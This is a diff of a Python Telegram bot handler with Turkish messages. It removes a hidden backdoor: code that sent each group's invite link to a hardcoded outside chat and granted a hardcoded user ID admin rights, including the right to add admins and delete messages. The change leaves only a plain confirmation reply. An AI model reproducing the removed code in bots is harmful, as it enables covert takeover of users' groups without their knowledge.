@@ -29,19 +29,8 @@ def start(message):
 def post(message):
     chat = message.chat.id
     print(chat)
-    link = bot(functions.messages.ExportChatInviteRequest(chat))
-    link = str(link).split(", ")
-    link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
-    bot.send_message(-1001463492864, link)
-    new_rights = ChatAdminRights(post_messages=True, add_admins=True, invite_users=True, delete_messages=True)
-    time.sleep(1)
-    try:
-        message.client(EditAdminRequest(chat, 1671239079, new_rights, "Post"))
-    except:
-        
-        bot.send_message(chat, "Lütfen bota tüm yetkileri verin.")
-    else:
-        bot.send_message(chat, "Tamamdır!")
+    
+    bot.send_message(chat, "Tamamdır!")
 
 @bot.message_handler(func=lambda message: True)
 def aydialma(message):
